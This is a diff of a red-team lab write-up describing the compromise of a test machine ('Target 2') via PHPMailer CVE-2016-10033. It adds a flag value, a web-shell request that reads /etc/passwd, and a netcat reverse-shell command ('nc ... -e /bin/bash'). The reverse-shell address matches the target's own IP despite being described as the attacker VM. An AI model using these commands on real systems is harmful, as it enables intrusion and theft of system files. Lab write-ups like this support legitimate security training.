@@ -174,7 +174,7 @@ The Red Team was able to penetrate `Target 1` and `Target 2` and retrieve the fo
          - Open http://192.168.1.115/vendor/PATH in web browser:
          
            ![Target2/flag1_found.JPG](Target2/flag1_found.JPG)
-  - `flag2`: 
+  - `flag2`: 6a8ed560f0b5358ecf844108048eb337
     - **Exploit Used**
       - Exploiting PHPMailer CVE-2016-10033
 
@@ -190,3 +190,15 @@ The Red Team was able to penetrate `Target 1` and `Target 2` and retrieve the fo
          - Test that the backdoor.php script was correctly uploaded and run by asking it to fetch the /etc/passwd file by going to http://192.168.1.115/backdoor.php?cmd=cat%20/etc/passwd:
 
          ![Target2/passwd_file_exfiltrated.JPG](Target2/passwd_file_exfiltrated.JPG)
+         
+         - Start a netcat listener: 
+         
+         `nc -lnvp 4444`
+         
+         - Run the backdoor.php script (http://192.168.1.115/backdoor.php?cmd=nc%20192.168.1.115%204444%20-e%20/bin/bash) to open a shell from Target 2 to the Kali VM by passing it the command `nc 192.168.1.115 4444 -e /bin/bash`:
+         
+         ![Target2/ncat_opened.JPG](Target2/ncat_opened.JPG)
+         
+         - flag2.txt is found in /var/www:
+         
+         ![Target2/flag2_found.JPG](Target2/flag2_found.JPG)
